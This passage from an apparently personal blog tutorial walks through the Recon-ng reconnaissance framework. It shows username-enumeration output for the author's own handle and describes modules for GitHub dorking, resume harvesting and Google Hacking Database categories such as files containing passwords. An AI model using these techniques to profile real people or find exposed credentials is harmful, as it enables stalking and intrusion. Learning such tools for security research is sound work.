[</em>] Team Treehouse: Available.
[<em>] AngelList: Available.
[</em>] Viddler: Available.
[<em>] tsu: Available.
[</em>] last.fm: Available.
[<em>] Technorati: Available.
[</em>] Aviary: User exists!
[<em>] Fotolog: User exists!
[</em>] Slideshare: Available.
[<em>] Blinklist: Available.
[</em>] Tripit: User exists!
[<em>] GogoBot: Available.
[</em>] Flavors.me: Available.
[<em>] BuzzFeed: Available.
[</em>] TripAdvisor: Available.
[<em>] blip.fm: Available.
[</em>] Dribbble: Available.
[<em>] Geeklist: User exists!
[</em>] Papaly: Available.
[<em>] wishlistr: Available.
[</em>] Vk: Available.
[<em>] Pastebin: Available.
[</em>] Coinbase: Available.
[<em>] iFunny: Available.
[</em>] Roblox: User exists!
[<em>] XFire: Available.
[</em>] Witty: User exists!
[<em>] Wikipedia: Available.
[</em>] Hacker<a href="news:">news:</a> User exists!
[<em>] StreamMe: Available.
[</em>] Abouto: Available.
[<em>] qmpeople: Available.
[</em>] Fiverr: Available.
[<em>] Plenty Of Fish: Available.
[</em>] Voat: User exists!
[<em>] Trakt: Available.
[</em>] IFTTT: Available.
[<em>] Crokes: User exists!
[</em>] Tracky: Available.
[<em>] GetSatisfaction: Available.
[</em>] Ello: User exists!</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 24 total (24 new) profiles found.
```</p>

<p>Hmm, quite a few other &ldquo;challengers&rdquo;.</p>

<ul>
<li>OSINT HUMINT Profile Collector &ndash; Takes each username from the profiles table and searches a variety of web sites for those users.</li>
</ul>


<p>This one checks 191 sites for the username, here we go:</p>

<p>``` plain
[recon-ng][default][profiler] > run
[*] Retrieving <a href="https://raw.githubusercontent.com/WebBreacher/WhatsMyName/master/web_accounts_list.json...">https://raw.githubusercontent.com/WebBreacher/WhatsMyName/master/web_accounts_list.json...</a></p>

<p>  Looking Up Data For: Chousensha</p>

<hr />

<p>[<em>] Checking: about.me
[</em>] Checking: AdultFriendFinder
[<em>] Checking: Matchdoctor
[</em>] Checking: AngelList
[<em>] Checking: aNobil
[</em>] Checking: ask.fm
[<em>] Checking: Atlassian
[</em>] Checking: Atlassian Self-Signup
[<em>] Checking: AudioBoom
[</em>] Checking: authorSTREAM
[<em>] Checking: badoo
[</em>] Checking: Bitbucket
[<em>] Checking: BLIP.fm
[</em>] Checking: Black Planet
[<em>] Checking: Blogmarks
[</em>] Checking: Blogspot
[<em>] Checking: BodyBuilding.com
[</em>] Checking: Break
[<em>] Checking: Bugcrowd
[</em>] Checking: cafemom
[<em>] Checking: CarDomain
[</em>] Checking: cHEEZburger
[<em>] Checking: CodePlex
[</em>] Checking: CoderStats
[<em>] Checking: COLOURlovers
[</em>] Checking: Conferize
[<em>] Checking: copytaste
[</em>] Checking: cruiseMates
[<em>] Checking: Dailymotion
[</em>] Checking: Delicious
[<em>] Checking: DeviantArt
[</em>] Checking: diigo
[<em>] Checking: DIY
[</em>] Checking: eBay
[<em>] Checking: EightBit
[</em>] [profile] chousensha &ndash; CoderStats (<a href="http://coderstats.net/github/chousensha/">http://coderstats.net/github/chousensha/</a>)
[<em>] Checking: Engadget
[</em>] Checking: EPORNER
[<em>] Checking: Etsy
[</em>] Checking: facebook.com
[<em>] Checking: families.com
[</em>] Checking: fanpop
[<em>] Checking: FFFFOUND!
[</em>] Checking: Fiverr
[<em>] Checking: Flickr
[</em>] Checking: Foodspotting
[<em>] Checking: Fotolog
[</em>] Checking: Foursquare
[<em>] Checking: freesound
[</em>] Checking: FriendFinder-X
[<em>] Checking: FunnyOrDie
[</em>] Checking: Garmin connect
[<em>] Checking: GeekGrade
[</em>] Checking: Geocaching
[<em>] Checking: GETItON
[</em>] Checking: GitHub
[<em>] Checking: gogobot
[</em>] Checking: goodreads
[<em>] Checking: Gravatar
[</em>] Checking: howaboutwe
[<em>] Checking: HubPages
[</em>] Checking: I-am-pregnant
[<em>] Checking: IFTTT
[</em>] [profile] chousensha &ndash; GitHub (<a href="https://api.github.com/users/chousensha">https://api.github.com/users/chousensha</a>)
[<em>] Checking: ImageShack
[</em>] Checking: imgur
[<em>] Checking: InsaneJournal
[</em>] Checking: Instagram
[<em>] Checking: instructables
[</em>] Checking: Internet Archive
[<em>] Checking: interpals
[</em>] Checking: Keybase
[<em>] Checking: Klear
[</em>] Checking: Klout
[<em>] Checking: Kongregate
[</em>] Checking: Lanyrd
[<em>] Checking: Last.fm
[</em>] Checking: LibraryThing
[<em>] Checking: LinkedIn
[</em>] Checking: LiveJasmin
[<em>] Checking: Marketing Land
[</em>] Checking: mate1
[<em>] [profile] chousensha &ndash; Kongregate (<a href="http://www.kongregate.com/accounts/chousensha">http://www.kongregate.com/accounts/chousensha</a>)
[</em>] Checking: Medium
[<em>] Checking: Meetzur
[</em>] Checking: Microsoft Technet Community
[<em>] Checking: Mixcloud
[</em>] Checking: Mixcrate
[<em>] Checking: Mixlr
[</em>] Checking: Mod DB
[<em>] Checking: Muck Rack
[</em>] [profile] chousensha &ndash; Internet Archive (<a href="http://archive.org/search.php?query=chousensha">http://archive.org/search.php?query=chousensha</a>)
[<em>] Checking: MyBuilder.com
[</em>] Checking: MyFitnessPal
[<em>] Checking: MyLot
[</em>] Checking: Myspace
[<em>] Checking: netvibes
[</em>] Checking: Newsvine
[<em>] Checking: Overcast Network
[</em>] Checking: Photoblog
[<em>] Checking: PhotoBucket
[</em>] Checking: PictureTrail
[<em>] Checking: PinkBike
[</em>] Checking: Pinterest
[<em>] Checking: Playlists.net
[</em>] Checking: Plurk
[<em>] Checking: POF
[</em>] Checking: Porn.com
[<em>] Checking: Pornhub
[</em>] Checking: PSNProfiles
[<em>] Checking: raptr
[</em>] Checking: Readability
[<em>] Checking: Reunion.com
[</em>] Checking: scratch
[<em>] Checking: Security Street
[</em>] Checking: SEOClerks
[<em>] Checking: setlist.fm
[</em>] Checking: Shopcade
[<em>] Checking: singlemuslim
[</em>] Checking: slideshare
[<em>] Checking: SmugMug
[</em>] Checking: smule
[<em>] Checking: snooth
[</em>] Checking: Soup
[<em>] Checking: Speaker Deck
[</em>] Checking: sporcle
[<em>] Checking: Steam
[</em>] Checking: stupidcancer
[<em>] Checking: TF2 Backpack Examiner
[</em>] Checking: theguardian
[<em>] Checking: thesixtyone
[</em>] Checking: tribe
[<em>] Checking: tripadvisor
[</em>] Checking: Tripit
[<em>] Checking: tumblr
[</em>] Checking: Twitter
[<em>] Checking: untappd
[</em>] Checking: uSTREAM
[<em>] Checking: viddler
[</em>] Checking: VideoLike
[<em>] Checking: vidme
[</em>] Checking: Vimeo
[<em>] Checking: Vine
[</em>] Checking: VisualizeUs
[<em>] Checking: Voices.com
[</em>] Checking: Wanelo
[<em>] Checking: wattpad
[</em>] Checking: WeeWorld
[<em>] Checking: wishlistr
[</em>] [profile] chousensha &ndash; VideoLike (<a href="http://videolike.org/video/chousensha">http://videolike.org/video/chousensha</a>)
[<em>] Checking: Wikipedia
[</em>] [profile] chousensha &ndash; Twitter (<a href="https://twitter.com/chousensha">https://twitter.com/chousensha</a>)
[<em>] Checking: WordPress
[</em>] Checking: WordPress Support
[<em>] Checking: Xanga
[</em>] Checking: Xbox Gamertag
[<em>] Checking: xHamster
[</em>] Checking: XVIDEOS
[<em>] Checking: YouTube
[</em>] Checking: Zooppa
[*] [profile] chousensha &ndash; YouTube (<a href="https://www.youtube.com/user/chousensha/videos">https://www.youtube.com/user/chousensha/videos</a>)</p>

<hr />

<h2>SUMMARY</h2>

<p>[*] 7 total (5 new) profiles found.
```</p>

<ul>
<li><p>Twitter Handles &ndash; Searches Twitter for users that mentioned, or were mentioned by, the given handle.</p></li>
<li><p>Github Code Enumerator &ndash; Uses the Github API to enumerate repositories and gists owned by a Github user. Updates the
&lsquo;repositories&rsquo; table with the results.</p></li>
<li><p>Github Commit Searcher &ndash; Uses the Github API to gather user profiles from repository commits. Updates the &lsquo;profiles&rsquo; table
with the results.</p></li>
<li><p>Github Gist Searcher &ndash; Uses the Github API to download and search Gists for possible information disclosures. Updates the
&lsquo;vulnerabilities&rsquo; table with the results</p></li>
<li><p>Github Dork Analyzer &ndash; Uses the Github API to search for possible vulnerabilites in source code by leveraging Github Dorks
and the &lsquo;repo&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
<li><p>Indeed Resume Crawl &ndash; Crawls Indeed.com for contacts and resumes. Adds name, title, and location to the contacts table and
a link to the resume in the profiles table. Can only harvest the first 1,000 results. Result set
changes, so running the same crawl mutiple times can produce new contacts. If the PAST_EMPS option
is set to true, the module will crawl both current and past employees. Given a keyword, the module
will only harvest contacts whose resumes contain the keyword. (e.g. Linux Admin)</p></li>
<li><p>Meta Data Extractor &ndash; Searches for files associated with the provided domain(s) and extracts any contact related metadata</p></li>
<li><p>HackerTarget Lookup &ndash; Uses the HackerTarget.com API to find host names. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>ThreatCrowd DNS lookup &ndash; Leverages the ThreatCrowd passive DNS API to discover hosts/subdomains.</p></li>
<li><p>Google Hacking Database &ndash; Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
and the &lsquo;site&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
</ul>


<p>This module is massive! Basically, you get Google dorks inside Recon-ng!</p>

<p>``` plain
[recon-ng][default][ghdb] > show info</p>

<pre><code>  Name: Google Hacking Database
  Path: modules/recon/domains-vulnerabilities/ghdb.py
Author: Tim Tomes (@LaNMaSteR53)
</code></pre>

<p>Description:
  Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
  and the &lsquo;site&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p>

<p>Options:
  Name                                 Current Value  Required  Description</p>

<hr />

<p>  DORKS                                               no        file containing an alternate list of Google dorks
  GHDB_ADVISORIES_AND_VULNERABILITIES  False          yes       enable/disable the 1996 dorks in this category
  GHDB_ERROR_MESSAGES                  False          yes       enable/disable the 93 dorks in this category
  GHDB_FILES_CONTAINING_JUICY_INFO     False          yes       enable/disable the 366 dorks in this category
  GHDB_FILES_CONTAINING_PASSWORDS      False          yes       enable/disable the 199 dorks in this category
  GHDB_FILES_CONTAINING_USERNAMES      False          yes       enable/disable the 17 dorks in this category
  GHDB_FOOTHOLDS                       False          yes       enable/disable the 49 dorks in this category
  GHDB_NETWORK_OR_VULNERABILITY_DATA   False          yes       enable/disable the 63 dorks in this category
  GHDB_PAGES_CONTAINING_LOGIN_PORTALS  False          yes       enable/disable the 372 dorks in this category
  GHDB_SENSITIVE_DIRECTORIES           False          yes       enable/disable the 119 dorks in this category
  GHDB_SENSITIVE_ONLINE_SHOPPING_INFO  False          yes       enable/disable the 11 dorks in this category
  GHDB_VARIOUS_ONLINE_DEVICES          False          yes       enable/disable the 307 dorks in this category
  GHDB_VULNERABLE_FILES                False          yes       enable/disable the 62 dorks in this category
  GHDB_VULNERABLE_SERVERS              False          yes       enable/disable the 83 dorks in this category
  GHDB_WEB_SERVER_DETECTION            False          yes       enable/disable the 77 dorks in this category
  SOURCE                               default        yes       source of input (see &lsquo;show info&rsquo; for details)</p>

<p>Source Options:
  default        SELECT DISTINCT domain FROM domains WHERE domain IS NOT NULL
  <string>       string representing a single input
  <path>         path to a file containing a list of inputs
  query <sql>    database query returning one column of inputs</p>

<p>Comments:
  * Special thanks to the Offenvise Security crew for maintaining the GHDB and making it available to
  open source projects like Recon-ng. Thanks Muts!
```</p>

<ul>
<li><p>SSLTools.com Host Name Lookups &ndash; Uses the ssltools.com site to obtain host names from a site&rsquo;s SSL certificate metadata to update the
&lsquo;hosts&rsquo; table.  Security issues with the certificate trust are pushed to the &lsquo;vulnerabilities&rsquo;
table.</p></li>
<li><p>censys.io port lookup by netblock &ndash; Queries censys.io to enumerate open ports for a netblock</p></li>
</ul>


<h2>Reporting</h2>

<ul>
<li><p>CSV File Creator &ndash; Creates a CSV file containing the specified harvested data</p></li>
<li><p>HTML Report Generator &ndash; Creates a HTML report</p></li>
</ul>


<p>I really liked the HTML report format. It classifies data into:</p>

<p><code>plain
domains
companies   
netblocks   
locations   
vulnerabilities
ports   
hosts   
contacts    
credentials
leaks   
pushpins    
profiles    
repositories
</code></p>

<ul>
<li><p>JSON Report Generator &ndash; Creates a JSON report.</p></li>
<li><p>List Creator &ndash; Creates a file containing a list of records from the database</p></li>
<li><p>PushPin Report Generator &ndash; Creates HTML media and map reports for all of the PushPins stored in the database.</p></li>
<li><p>XLSX File Creator &ndash; Creates an Excel compatible XLSX file containing the entire data set</p></li>
<li><p>XML Report Generator -Creates a XML report</p></li>
</ul>


<p>It took a while to list everything! As you could see, the Recon-ng framework is an information gathering tool on steroids! And if you can&rsquo;t find what you need among the current modules, you can write your own and contribute!</p>

<p>Until next time, here&rsquo;s the cookie straight from the cow&rsquo;s mouth:</p>

<p>``` plain</p>

<hr />

<p>/ Q: How did you get into artificial   \
| intelligence? A: Seemed logical &mdash; I |
\ didn&rsquo;t have any real intelligence.   /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
